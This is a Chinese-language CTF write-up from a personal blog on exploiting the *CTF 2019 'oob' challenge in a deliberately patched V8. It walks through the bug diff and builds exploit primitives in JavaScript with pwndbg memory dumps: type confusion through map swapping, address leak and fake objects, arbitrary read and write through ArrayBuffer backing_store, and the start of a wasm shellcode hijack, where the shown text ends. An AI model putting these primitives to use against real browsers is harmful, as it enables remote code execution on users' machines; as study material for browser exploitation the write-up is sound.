<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>v8-exploit-*CTF_OOB | V1NKe的心情垃圾桶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="v8," />
  

  <meta name="description" content="v8">
<meta name="keywords" content="v8">
<meta property="og:type" content="article">
<meta property="og:title" content="v8-exploit-*CTF_OOB">
<meta property="og:url" content="http://yoursite.com/2019/06/08/v8-OOB-*CTF/index.html">
<meta property="og:site_name" content="V1NKe的心情垃圾桶">
<meta property="og:description" content="v8">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/*CTF2019-OOB/4756CD65-F51B-4430-AACF-EA1F14E1701D.png">
<meta property="og:updated_time" content="2019-06-11T01:58:22.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="v8-exploit-*CTF_OOB">
<meta name="twitter:description" content="v8">
<meta name="twitter:image" content="http://yoursite.com/*CTF2019-OOB/4756CD65-F51B-4430-AACF-EA1F14E1701D.png">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#类型混淆："><span class="toc-text">类型混淆：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄漏对象地址和构造地址对象："><span class="toc-text">泄漏对象地址和构造地址对象：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意写："><span class="toc-text">任意写：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意读："><span class="toc-text">任意读：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wasm劫持程序流："><span class="toc-text">wasm劫持程序流：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用成功："><span class="toc-text">利用成功：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-v8-OOB-*CTF" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">v8-exploit-*CTF_OOB</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2019.06.08</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>大概是入门级别的一次分析（或者入门都不算，很简单的一个分析orz。<br>首发于<a href="https://xz.aliyun.com/t/5368" target="_blank" rel="noopener">先知社区</a>。</p>
<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>拿到一个<code>diff</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len == 1)&#123;</span><br><span class="line">+        //read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        //write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<p>看新加的<code>oob</code>函数就行（虽然我也看不太懂写的是个啥玩楞2333。里面的<code>read</code>和<code>write</code>注释，还有直接取了<code>length</code>可以大概意识到是一个越界读写的漏洞。</p>
<p><code>a.oob()</code>就是将越界的首个8字节给读出，<code>a.oob(1)</code>就是将<code>1</code>写入越界的首个8字节。</p>
<p>那么越界读写就好办了，先测试一下看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  x64.release git:(6dc88c1) ✗ ./d8 </span><br><span class="line">V8 version 7.5.0 (candidate)</span><br><span class="line">d8&gt; a = [1,2,3,4]</span><br><span class="line">[1, 2, 3, 4]</span><br><span class="line">d8&gt; a.oob()    </span><br><span class="line">4.42876206109e-311</span><br></pre></td></tr></table></figure>
<p>因为v8中的数以浮点数的形式显示，所以先写好浮点数与整数间的转化原语函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var buff_area = new ArrayBuffer(0x10);</span><br><span class="line">var fl = new Float64Array(buff_area);</span><br><span class="line">var ui = new BigUint64Array(buff_area);</span><br><span class="line"></span><br><span class="line">function ftoi(floo)&#123;</span><br><span class="line">    fl[0] = floo;</span><br><span class="line">    return ui[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function itof(intt)&#123;</span><br><span class="line">    ui[0] = intt;</span><br><span class="line">    return fl[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function tos(data)&#123;</span><br><span class="line">    return &quot;0x&quot;+data.toString(16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上手调试，先看看一个数组的排布情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = [0x1000000,2,3,4];</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x101d1f8d0069-1</span><br><span class="line">0x101d1f8d0068:	0x00000a9abe942d99	0x000012a265ac0c71   --&gt; JSArray</span><br><span class="line">0x101d1f8d0078:	0x0000101d1f8cf079	0x0000000400000000</span><br><span class="line">0x101d1f8d0088:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x101d1f8d0098:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x101d1f8d00a8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10xg 0x0000101d1f8cf079-1</span><br><span class="line">0x101d1f8cf078:	0x000012a265ac0851	0x0000000400000000   --&gt; FixedArray</span><br><span class="line">0x101d1f8cf088:	0x0100000000000000	0x0000000200000000</span><br><span class="line">0x101d1f8cf098:	0x0000000300000000	0x0000000400000000</span><br><span class="line">0x101d1f8cf0a8:	0x000012a265ac0851	0x0000005c00000000</span><br><span class="line">0x101d1f8cf0b8:	0x0000000000000000	0x0000006100000000</span><br></pre></td></tr></table></figure>
<p>所以此时的<code>a.oob()</code>所泄漏的应该是<code>0x000012a265ac0851</code>的double形式。但是我们无法知道<code>0x000012a265ac0851</code>是什么内容，不可控。那么我们换一个数组，看以下数组情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = [1.1,2.2,3.3,4.4];</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x0797a34100c9-1</span><br><span class="line">0x797a34100c8:	0x00001c07e15c2ed9	0x00000df4ef880c71   --&gt; JSArray</span><br><span class="line">0x797a34100d8:	0x00000797a3410099	0x0000000400000000</span><br><span class="line">0x797a34100e8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x797a34100f8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x797a3410108:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10xg 0x00000797a3410099-1</span><br><span class="line">0x797a3410098:	0x00000df4ef8814f9	0x0000000400000000   --&gt; FixedArray</span><br><span class="line">0x797a34100a8:	0x3ff199999999999a	0x400199999999999a</span><br><span class="line">0x797a34100b8:	0x400a666666666666	0x401199999999999a</span><br><span class="line">0x797a34100c8:	0x00001c07e15c2ed9	0x00000df4ef880c71   --&gt; JSArray</span><br><span class="line">0x797a34100d8:	0x00000797a3410099	0x0000000400000000</span><br></pre></td></tr></table></figure>
<p>我们可以看见<code>FixedArray</code>和<code>JSArray</code>是紧邻的，所以<code>a.oob()</code>泄漏的是<code>0x00001c07e15c2ed9</code>，即<code>JSArray</code>的<code>map</code>值（<code>PACKED_DOUBLE_ELEMENTS</code>）。这样我们就好构造利用了。</p>
<h3 id="类型混淆："><a href="#类型混淆：" class="headerlink" title="类型混淆："></a>类型混淆：</h3><p>假设我们有一个浮点型的数组和一个对象数组，我们先用上面所说的<code>a.oob()</code>泄漏各自的<code>map</code>值，在用我们的可写功能，将浮点型数组的<code>map</code>写入对象数组的<code>map</code>，这样对象数组中所存储的对象地址就被当作了浮点值，因此我们可以泄漏任意对象的地址。</p>
<p>相同的，将对象数组的<code>map</code>写入浮点型数组的<code>map</code>，那么浮点型数组中所存储的浮点值就会被当作对象地址来看待，所以我们可以构造任意地址的对象。</p>
<h3 id="泄漏对象地址和构造地址对象："><a href="#泄漏对象地址和构造地址对象：" class="headerlink" title="泄漏对象地址和构造地址对象："></a>泄漏对象地址和构造地址对象：</h3><p>先得到两个类型的<code>map</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&quot;A&quot;:0x100&#125;;</span><br><span class="line">var obj_all = [obj];</span><br><span class="line">var array_all = [1.1,2,3];</span><br><span class="line">var obj_map = obj_all.oob();       //obj_JSArray_map</span><br><span class="line">var float_array_map = array_all.oob();   //float_JSArray_map</span><br></pre></td></tr></table></figure>
<p>再写出泄漏和构造的两个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function leak_obj(obj_in)&#123;                //泄漏对象地址</span><br><span class="line">    obj_all[0] = obj_in;</span><br><span class="line">    obj_all.oob(float_array_map);</span><br><span class="line">    let leak_obj_addr = obj_all[0];</span><br><span class="line">    obj_all.oob(obj_map);</span><br><span class="line">    return ftoi(leak_obj_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fake_obj(obj_in)&#123;                //构造地址对象</span><br><span class="line">    array_all[0] = itof(obj_in);</span><br><span class="line">    array_all.oob(obj_map);</span><br><span class="line">    let fake_obj_addr = array_all[0];</span><br><span class="line">    array_all.oob(float_array_map);</span><br><span class="line">    return fake_obj_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到了以上的泄漏和构造之后我们想办法将利用链扩大，构造出任意读写的功能。</p>
<h3 id="任意写："><a href="#任意写：" class="headerlink" title="任意写："></a>任意写：</h3><p>先构造一个浮点型数组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = [7.7,1.1,1,0xfffffff];</span><br></pre></td></tr></table></figure>
<p>再泄漏该数组地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leak_obj(test);</span><br></pre></td></tr></table></figure>
<p>这样我们可以得到数组的内存地址，此时数组中的情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x2d767fbd0019-1-0x30</span><br><span class="line">0x2d767fbcffe8:	0x000030a6f3b014f9	0x0000000400000000   --&gt; FixedArray</span><br><span class="line">0x2d767fbcfff8:	0x00003207dce82ed9	0x3ff199999999999a</span><br><span class="line">0x2d767fbd0008:	0x3ff0000000000000	0x41affffffe000000</span><br><span class="line">0x2d767fbd0018:	0x00003207dce82ed9	0x000030a6f3b00c71   --&gt; JSArray</span><br><span class="line">0x2d767fbd0028:	0x00002d767fbcffe9	0x0000000400000000</span><br></pre></td></tr></table></figure>
<p>我们可以利用构造地址对象把<code>0x2d767fbcfff8</code>处伪造为一个<code>JSArray</code>对象，我们将<code>test[0]</code>写为浮点型数组的<code>map</code>即可。这样，<code>0x2d767fbcfff8-0x2d767fbd0018</code>的32字节就是<code>JSArray</code>，我们再在<code>0x2d767fbd0008</code>任意写一个地址，我们就能达到任意写的目的。比如我们将他写为<code>0x2d767fbcffc8</code>，那么<code>0x2d767fbcffc8</code>处就是伪造的<code>FixedArray</code>，<code>0x2d767fbcffc8+0x10</code>处就为<code>elements</code>的内容，把伪造的对象记为<code>fake_js</code>，那么执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_js[0] = 0x100;</span><br></pre></td></tr></table></figure>
<p>即把0x100复制给<code>0x2d767fbcffc8+0x10</code>处。</p>
<h3 id="任意读："><a href="#任意读：" class="headerlink" title="任意读："></a>任意读：</h3><p>任意读就很简单了，就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(fake_js[0]);</span><br></pre></td></tr></table></figure>
<p>取出数组内容即可。</p>
<p>那么接下来写构造出来的任意读写函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function write_all(read_addr,read_data)&#123;</span><br><span class="line">    let test_read = fake_obj(leak_obj(tt)-0x20n);</span><br><span class="line">    tt[2] = itof(read_addr-0x10n);</span><br><span class="line">    test_read[0] = itof(read_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read_all(write_addr)&#123;</span><br><span class="line">    let test_write = fake_obj(leak_obj(tt)-0x20n);</span><br><span class="line">    tt[2] = itof(write_addr-0x10n);</span><br><span class="line">    return ftoi(test_write[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了任意读写之后就好利用了，可以用<code>pwn</code>中的常规思路来后续利用：</p>
<ol>
<li>泄漏libc基址</li>
<li>覆写<code>__free_hook</code></li>
<li>触发<code>__free_hook</code></li>
</ol>
<p>后续在覆写<code>__free_hook</code>的过程中，会发现覆写不成功（说是浮点数组处理<code>7f</code>高地址的时候会有变换。</p>
<p>所以这里需要改写一下任意写，这里我们就需要利用<code>ArrayBuffer</code>的<code>backing_store</code>去利用任意写：</p>
<p>先新建一块写区域：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var buff_new = new ArrayBuffer(0x20);</span><br><span class="line">var dataview = new DataView(buff_new);</span><br><span class="line">%DebugPrint(buff_new);</span><br></pre></td></tr></table></figure>
<p>这时候写入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataview.setBigUint64(0,0x12345678,true);</span><br></pre></td></tr></table></figure>
<p>在<code>ArrayBuffer</code>中的<code>backing_store</code>字段中会发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x029ce8f500a9-1</span><br><span class="line">0x29ce8f500a8:	0x00002f1fa5c821b9	0x00002cb659b80c71</span><br><span class="line">0x29ce8f500b8:	0x00002cb659b80c71	0x0000000000000020</span><br><span class="line">0x29ce8f500c8:	0x000055555639fe70	--&gt; backing_store  0x0000000000000002</span><br><span class="line">0x29ce8f500d8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x29ce8f500e8:	0x00002f1fa5c81719	0x00002cb659b80c71</span><br><span class="line">pwndbg&gt; x/10xg 0x000055555639fe70</span><br><span class="line">0x55555639fe70:	0x0000000012345678	0x0000000000000000</span><br><span class="line">0x55555639fe80:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555639fe90:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x55555639fea0:	0x000055555639fe10	0x000000539d1ea015</span><br><span class="line">0x55555639feb0:	0x0000029ce8f500a9	0x000055555639fe70</span><br></pre></td></tr></table></figure>
<p>因此，只要我们先将<code>backing_store</code>改写为我们所想要写的地址，再利用dataview的写入功能即可完成任意写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function write_dataview(fake_addr,fake_data)&#123;</span><br><span class="line">    let buff_new = new ArrayBuffer(0x30);</span><br><span class="line">    let dataview = new DataView(buff_new);</span><br><span class="line">    let leak_buff = leak_obj(buff_new);</span><br><span class="line">    let fake_write = leak_buff+0x20n;</span><br><span class="line">    write_all(fake_write,fake_addr);</span><br><span class="line">    dataview.setBigUint64(0,fake_data,true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而后就可以按照正常流程来读写利用了。</p>
<p>这里就介绍一种在浏览器中比较稳定利用的一个方式，利用<code>wasm</code>来劫持程序流。</p>
<h3 id="wasm劫持程序流："><a href="#wasm劫持程序流：" class="headerlink" title="wasm劫持程序流："></a>wasm劫持程序流：</h3><p>在<code>v8</code>中，可以直接执行<code>wasm</code>中的字节码。有一个网站可以在线将C语言直接转换为wasm并生成JS调用代码：<code>https://wasdk.github.io/WasmFiddle</code>。</p>
<p>左侧是c语言，右侧是<code>js</code>代码，选<code>Code Buffer</code>模式，点<code>build</code>编译，左下角生成的就是<code>wasm code</code>。</p>
<p>有限的是c语言部分只能写一些很简单的<code>return</code>功能。多了赋值等操作就会报错。但是也足够了。</p>
<p>将上面生成的代码测试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var f = wasmInstance.exports.main;</span><br><span class="line">var leak_f = leak_obj(f);</span><br><span class="line">//console.log(&apos;0x&apos;+leak_f.toString(16));</span><br><span class="line">console.log(f());</span><br><span class="line">%DebugPrint(test);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>会得到<code>42</code>的结果，那么我们很容易就能想到，如果用任意写的功能，将<code>wasm</code>中的可执行区域写入<code>shellcode</code>呢？</p>
<p>我们需要找到可执行区域的字段。</p>
<p>直接给出字段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function–&gt;shared_info–&gt;WasmExportedFunctionData–&gt;instance</span><br></pre></td></tr></table></figure>
<p>在空间中的显示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Function:</span><br><span class="line">pwndbg&gt; x/10xg 0x144056c21f31-1</span><br><span class="line">0x144056c21f30:	0x00002ab4903c4379	0x00003de1f2ac0c71</span><br><span class="line">0x144056c21f40:	0x00003de1f2ac0c71	0x0000144056c21ef9   --&gt; shared_info</span><br><span class="line">0x144056c21f50:	0x0000144056c01869	0x000001a263740699</span><br><span class="line">0x144056c21f60:	0x00001defa6dc2001	0x00003de1f2ac0bc1</span><br><span class="line">0x144056c21f70:	0x0000000400000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
